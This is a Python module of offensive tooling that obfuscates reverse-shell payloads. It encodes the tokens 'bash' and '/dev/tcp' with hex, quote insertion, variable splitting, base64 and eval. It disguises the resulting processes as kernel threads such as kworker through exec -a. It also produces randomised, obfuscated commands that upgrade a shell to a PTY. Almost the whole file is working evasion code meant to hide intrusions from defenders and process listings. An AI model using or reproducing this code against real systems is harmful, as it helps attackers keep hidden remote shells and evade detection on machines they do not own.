from __future__ import annotations

import base64
import random
import string
from typing import Callable

_TOKENS = ["bash", "/dev/tcp"]


def _rand_var() -> str:
    return "_" + "".join(random.choices(string.ascii_lowercase, k=random.randint(1, 3)))


def _bash_ansi_c(payload: str) -> str:
    """Replace key tokens with $'\\xNN' ANSI-C quoting."""
    def encode(s: str) -> str:
        return "$'" + "".join(f"\\x{ord(c):02x}" for c in s) + "'"
    for token in sorted(_TOKENS, key=len, reverse=True):
        payload = payload.replace(token, encode(token))
    return payload


def _bash_printf_hex(payload: str) -> str:
    """Replace key tokens with $(printf '\\xNN...')."""
    def encode(s: str) -> str:
        return "$(printf '" + "".join(f"\\x{ord(c):02x}" for c in s) + "')"
    for token in sorted(_TOKENS, key=len, reverse=True):
        payload = payload.replace(token, encode(token))
    return payload


def _bash_quote_insert(payload: str) -> str:
    """Insert empty quotes inside key tokens (ba''sh, /dev/t''cp)."""
    def insert(s: str) -> str:
        i = random.randint(1, len(s) - 1)
        q = random.choice(('""', "''"))
        return s[:i] + q + s[i:]
    for token in sorted(_TOKENS, key=len, reverse=True):
        payload = payload.replace(token, insert(token))
    return payload


def _bash_var_split(payload: str) -> str:
    """Split key tokens across shell variables (_a=bas;_b=h;${_a}${_b} ...)."""
    assignments: list[str] = []
    result = payload
    for token in sorted(_TOKENS, key=len, reverse=True):
        if token not in result:
            continue
        i = random.randint(1, len(token) - 1)
        v1, v2 = _rand_var(), _rand_var()
        assignments += [f"{v1}={token[:i]}", f"{v2}={token[i:]}"]
        result = result.replace(token, f"${{{v1}}}${{{v2}}}", 1)
    if assignments:
        return ";".join(assignments) + ";" + result
    return result


def _bash_base64(payload: str) -> str:
    """Wrap entire payload in bash<<<$(base64 -d<<<...)."""
    encoded = base64.b64encode(payload.encode()).decode()
    return f"bash<<<$(base64 -d<<<{encoded})"


def _bash_ifs(payload: str) -> str:
    """Store payload in a variable and eval it.

    The payload is single-quote-safe: any single quote it already contains
    (e.g. from ansi_c / printf_hex / quote_insert) is escaped with the shell
    idiom '\\'' so chaining these methods before ifs stays valid.
    """
    v = _rand_var()
    safe = payload.replace("'", "'\\''")
    return f"export {v}='{safe}';eval \"${v}\""


_FAKE_PROC_NAMES = [
    "[kworker/0:1]", "[kworker/1:2]", "[kworker/2:0]",
    "[migration/0]", "[migration/1]",
    "[watchdog/0]",  "[watchdog/1]",
    "[ksoftirqd/0]", "[ksoftirqd/1]",
    "[rcu_sched]",   "[rcu_bh]",
]


def _bash_spoof_argv(payload: str) -> str:
    """Wrap with exec -a to spoof process name in ps/top."""
    name = random.choice(_FAKE_PROC_NAMES)
    encoded = base64.b64encode(payload.encode()).decode()
    return f"exec -a '{name}' bash <(echo {encoded}|base64 -d)"


METHODS: list[tuple[str, str, Callable[[str], str]]] = [
    ("ansi_c",      "$'\\xNN' ANSI-C quoting on key tokens",    _bash_ansi_c),
    ("printf_hex",  "$(printf '\\xNN') hex encoding",           _bash_printf_hex),
    ("quote_insert","empty quote injection (ba''sh)",            _bash_quote_insert),
    ("var_split",   "token split across shell variables",        _bash_var_split),
    ("base64",      "bash<<<$(base64 -d<<<...) full wrap",       _bash_base64),
    ("ifs",         "store in variable and eval",                _bash_ifs),
    ("spoof_argv",  "exec -a to mask process name in ps/top",   _bash_spoof_argv),
]


def _hex(s: str) -> str:
    return "".join(f"\\x{ord(c):02x}" for c in s)


def _py_hex_import() -> str:
    """__import__("\\x70\\x74\\x79").spawn("\\x2f\\x62\\x69\\x6e\\x2f\\x62\\x61\\x73\\x68")"""
    return f'__import__("{_hex("pty")}").spawn("{_hex("/bin/bash")}")'


def _py_getattr_concat() -> str:
    """getattr(__import__("p"+"ty"), "sp"+"awn")("/bin/bash")"""
    i = random.randint(1, 2)
    j = random.randint(1, 4)
    pty_split   = f'"{"pty"[:i]}"+"{"pty"[i:]}"'
    spawn_split = f'"{"spawn"[:j]}"+"{"spawn"[j:]}"'
    return f'getattr(__import__({pty_split}),{spawn_split})("/bin/bash")'


def _py_b64_exec() -> str:
    """exec(__import__("base64").b64decode(b"...").decode())"""
    payload = 'import pty; pty.spawn("/bin/bash")'
    encoded = base64.b64encode(payload.encode()).decode()
    return f'exec(__import__("base64").b64decode(b"{encoded}").decode())'


def obfuscated_upgrade_spawn() -> str:
    """Return a randomised obfuscated upgrade command for Linux PTY spawn."""
    technique = random.choice([_py_hex_import, _py_getattr_concat, _py_b64_exec])
    code = technique()
    name = random.choice(_FAKE_PROC_NAMES)
    py = (
        f"exec -a '{name}' python3 -c '{code}' 2>/dev/null || "
        f"exec -a '{name}' python -c '{code}' 2>/dev/null"
    )
    script = "$'" + "".join(f"\\x{ord(c):02x}" for c in "script") + "'"
    fallback = f"{script} -qc /bin/bash /dev/null"
    return f"{py} || {fallback}\n"
